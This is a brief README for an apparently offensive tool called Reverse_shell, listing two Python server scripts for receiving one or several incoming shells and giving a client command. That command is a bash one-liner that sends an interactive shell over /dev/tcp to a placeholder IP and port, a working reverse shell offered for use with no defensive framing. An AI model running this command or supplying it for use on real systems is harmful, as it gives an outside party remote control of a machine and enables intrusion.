# Reverse_shell

Reverse shell with python

- **reverse_server.py** For a single shell bounce
- **reverse_servers.py** Support multiple shell bounce

# Client command

	bash -c "bash -i &>/dev/tcp/<IP>/<Port> 0>&1"
